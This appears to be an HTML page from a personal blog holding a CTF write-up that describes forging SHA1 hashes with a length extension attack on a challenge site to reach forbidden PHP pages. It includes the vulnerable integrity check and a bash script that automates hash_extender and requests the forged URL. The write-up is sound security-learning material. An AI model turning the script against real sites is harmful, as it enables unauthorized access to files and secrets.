@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+      
+    <meta name="twitter:title" content="Journey Through Hashland (Incomplete)">
+    <meta name="twitter:description" content="Journey Through Hashland (Incomplete)">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:image" content="https://altelus1.github.io/writeups/ctf/rootcon18finals/images/web/in_memes_we_trust/img1.PNG" />
+    
+    <meta property="og:image" content="/writeups/ctf/rootcon18finals/images/web/in_memes_we_trust/img1.PNG">
+    <meta property="og:description" content="Journey Through Hashland (Incomplete)">
+    <title>Journey Through Hashland (Incomplete)</title><!-- Begin Jekyll SEO tag v2.8.0 -->
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Journey Through Hashland (Incomplete)" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://localhost:4000/writeups/ctf/rootcon18finals/hashland.html" />
+<meta property="og:url" content="http://localhost:4000/writeups/ctf/rootcon18finals/hashland.html" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Journey Through Hashland (Incomplete)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","headline":"Journey Through Hashland (Incomplete)","url":"http://localhost:4000/writeups/ctf/rootcon18finals/hashland.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
+
+
+<body>
+    <div class="container"><header>
+  <div class="menu">
+    <ul><li><a href="/">Home</a></li><li><a href="/about.html">About</a></li><li><a href="/writeups/">Writeups</a></li><li><a href="/projects/">Projects</a></li></ul>
+  </div>
+</header>
+<main>
+      <h1 id="web-journey-through-hashland-incomplete">[Web] Journey Through Hashland (Incomplete)</h1>
+<p>As the title states, we did not manage to find the flag and only managed to exploit the Hash Length Extension attack.<br />
+We’re given with the link <code class="language-plaintext highlighter-rouge">https://globe-express-finals.pwndemanila.ph</code><br />
+<img src="images/web/hashland/img1.PNG" alt="lol it didn't load" /><br />
+Viewing the source code, we have this:<br />
+<img src="images/web/hashland/img2.PNG" alt="lol it didn't load" /><br />
+It’s noticeable the 3 links in the source code. A request to <code class="language-plaintext highlighter-rouge">/get.php</code> with <code class="language-plaintext highlighter-rouge">path</code> parameter accepting base64 input and the <code class="language-plaintext highlighter-rouge">hash</code> parameter accepting some kind of hash hex string. We checked out the first one and we got the source code below. It only redirects us to <code class="language-plaintext highlighter-rouge">https://www.google.com/maps</code>.<br />
+<img src="images/web/hashland/img3.PNG" alt="lol it didn't load" /><br />
+Changing even one character in the hash will return integrity error:<br />
+<img src="images/web/hashland/img3.5.png" alt="lol it didn't load" /><br />
+We also checked out the actual string behind the base64:<br />
+<img src="images/web/hashland/img4.png" alt="lol it didn't load" /><br />
+We wanted to know as well what hash type it is and if we can replicate the hash from the base64 decoded values.<br />
+<img src="images/web/hashland/img5.png" alt="lol it didn't load" /><br />
+We tried getting the sha1sum of <code class="language-plaintext highlighter-rouge">destinations</code> and it doesn’t match to the ones in the website. This means that additional data is being padded, appended, or prepended to <code class="language-plaintext highlighter-rouge">page</code> decoded parameter.<br />
+<img src="images/web/hashland/img5.5.png" alt="lol it didn't load" /><br />
+So we tried to look for similar challenges online to have an idea what kind of exploit we can use against this kind of setup. We found the one from <a href="https://isc.sans.edu/diary/Modern+Web+Application+Penetration+Testing+Hash+Length+Extension+Attacks/22792/">SANS</a> about Hash Length Extensions attack. Basically, you can create a new valid hash and append some data from the original data provided.<br />
+<img src="images/web/hashland/img7.png" alt="lol it didn't load" /><br />
+This means if Hash Length Extension attack works, we can attempt to do Path Traversal + Local File Inclusion (LFI) and try to load data. This would very well work against the forbidden <code class="language-plaintext highlighter-rouge">flag.php</code> page.<br />
+<img src="images/web/hashland/img19.png" alt="lol it didn't load" /><br />
+Upon reading the SANS writeup page, we found out we can use <a href="https://github.com/iagox86/hash_extender">hash_extender</a> to create a new valid hash with also a new malicious appended data.<br />
+<img src="images/web/hashland/img8.png" alt="lol it didn't load" /><br />
+<img src="images/web/hashland/img9.png" alt="lol it didn't load" /><br />
+The nightmare doesn’t end there and this is where we spent most of our time trying to solve this since each time we used the hash_extender to forge new data and hash, the integrity error message is still being returned. <strong>WE DON”T KNOW THE FORMAT OF DATA WE SHOULD INPUT ON THE HASH EXTENDER</strong>  We banged our head here and there, tried applying hash_extender against the base64 instead, tried it with the equals sign present, tried double hashing it and so on. What eventually worked is that:
+<br /></p>
+<ol>
+  <li>Set data to hash_extender with the “.php” on the base64 decoded data. e.g. “destinations” becomes “destinations.php”</li>
+  <li>The appended data should also have the “.php” in the end.</li>
+  <li>The resulting new data will have a “.php” in the end of it. <strong>REMOVE IT WHEN SUBMITTING TO get.php</strong></li>
+</ol>
+
+<p><br />The reason why this is needed is because in the backend, this is what’s roughly happening when it tries to do some integrity checks:
+<br /></p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mf">...</span>
+<span class="nv">$final_hash</span> <span class="o">=</span> <span class="nb">sha1</span><span class="p">(</span><span class="nv">$secret</span> <span class="mf">.</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">])</span> <span class="mf">.</span> <span class="s2">".php"</span> <span class="p">);</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nv">$final_hash</span> <span class="o">!==</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'hash'</span><span class="p">])</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"Don't fat finger my site!"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="mf">...</span>
+</code></pre></div></div>
+<p><br />Therefore, you always remove the “.php” from the appended data when submitting because the backend does it already for you.<br />
+This is and example of a working hash_extender command that we have:<br />
+<img src="images/web/hashland/img10.png" alt="lol it didn't load" /><br />
+Below is the extraction of the new appended data and noting the new hash.<br />
+<img src="images/web/hashland/img11.png" alt="lol it didn't load" /><br />
+We just have to convert the new data to base64 and we put everything to together and submit the request to <code class="language-plaintext highlighter-rouge">/get.php</code><br />
+<img src="images/web/hashland/img12.png" alt="lol it didn't load" /><br />
+We automated this whole process by creating the following bash script below:
+<br /></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nv">original_data</span><span class="o">=</span><span class="nv">$1</span>
+<span class="nv">original_hash</span><span class="o">=</span><span class="nv">$2</span>
+<span class="nv">to_append</span><span class="o">=</span><span class="nv">$3</span>
+
+./hash_extender <span class="nt">-d</span> <span class="s2">"</span><span class="nv">$1</span><span class="s2">.php"</span> <span class="nt">--secret</span> 32 <span class="nt">--append</span> <span class="s2">"</span><span class="nv">$3</span><span class="s2">.php"</span> <span class="nt">--signature</span> <span class="nv">$original_hash</span> <span class="nt">--format</span> sha1 <span class="nt">--out-data-format</span> raw <span class="nt">--table</span> <span class="o">&gt;</span> hash_extender_output.txt
+
+<span class="nv">new_hash</span><span class="o">=</span><span class="si">$(</span><span class="nb">head</span> <span class="nt">-n</span> 1 hash_extender_output.txt | <span class="nb">awk</span> <span class="s1">'{ print $2 }'</span><span class="si">)</span>
+<span class="nb">echo</span> <span class="s2">"[*] new hash: "</span> <span class="nv">$new_hash</span>
+<span class="nb">cat </span>hash_extender_output.txt | <span class="nb">awk</span> <span class="nt">-F</span><span class="s2">"</span><span class="nv">$new_hash</span><span class="s2"> "</span> <span class="s1">'{ print $2 }'</span> <span class="o">&gt;</span> urls.txt
+
+<span class="nv">new_b64</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>urls.txt | <span class="nb">sed</span> <span class="nt">-z</span> <span class="s2">"s/</span><span class="se">\n</span><span class="s2">//g"</span> | <span class="nb">sed</span> <span class="s2">"s/.php</span><span class="se">\$</span><span class="s2">//g"</span> | <span class="nb">base64</span> <span class="nt">-w</span> 0<span class="si">)</span>
+
+<span class="nv">new_url</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"https://globe-express-finals.pwndemanila.ph/get.php?page=</span><span class="nv">$new_b64</span><span class="s2">&amp;hash=</span><span class="nv">$new_hash</span><span class="s2">"</span><span class="si">)</span>
+
+<span class="nb">echo</span> <span class="s2">"New url: [*] </span><span class="nv">$new_url</span><span class="s2">"</span>
+curl <span class="nv">$new_url</span>
+</code></pre></div></div>
+<p><br />An example of usage of the script:<br />
+<img src="images/web/hashland/img14.png" alt="lol it didn't load" /><br />
+We then targeted the <code class="language-plaintext highlighter-rouge">phpinfo.php</code>. This is also a forbidden page.<br />
+<img src="images/web/hashland/img15.png" alt="lol it didn't load" /><br />
+The PHP info page…<br />
+<img src="images/web/hashland/img16.png" alt="lol it didn't load" /><br />
+It also has the secret key used by the sha1 function in the backend:<br />
+<img src="images/web/hashland/img17.png" alt="lol it didn't load" /><br />
+We can now forge new payloads for the page without the hash_extender. Example of the “destinations” page forgery below:<br />
+<img src="images/web/hashland/img20.png" alt="lol it didn't load" /><br />
+<img src="images/web/hashland/img21.png" alt="lol it didn't load" /><br />
+And this our progress ends sadly. What we did next is that we tried to forge new payloads where we used PHP Filters, data, and some other payloads so that we can execute code or read arbitary files but no payloads have been working.<br />
+The challenge author (Motoh4ck3r) mentioned that the flag should be near through one of the server variables but the PHP Info output that we got doesn’t have it. There are other payloads we can use but since the “.php” extension appending done by the backend, it may restrict our payloads. We have to do some more bypasses where we simply don’t have time during the competition.</p>
+
+
+
+    </main><footer>
+  
+</footer>
+</div>
+  </body>
+</html>
